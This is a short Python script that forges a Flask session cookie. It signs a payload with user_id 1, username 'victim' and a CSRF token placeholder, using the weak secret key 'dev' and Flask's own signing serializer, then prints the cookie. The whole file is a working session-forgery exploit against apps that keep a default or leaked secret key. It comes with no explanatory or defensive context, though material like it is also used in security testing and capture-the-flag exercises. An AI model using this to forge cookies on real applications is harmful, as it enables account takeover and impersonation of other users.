from flask import Flask
from flask.sessions import SecureCookieSessionInterface


def main():
    app = Flask(__name__)
    app.secret_key = 'dev'

    data = {
        "user_id": 1,
        "username": "victim",
        "csrf_token": "<random value>"
    }

    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    cookie_value = serializer.dumps(data)

    print(f"session cookie: {cookie_value}")


if __name__ == "__main__":
    main()
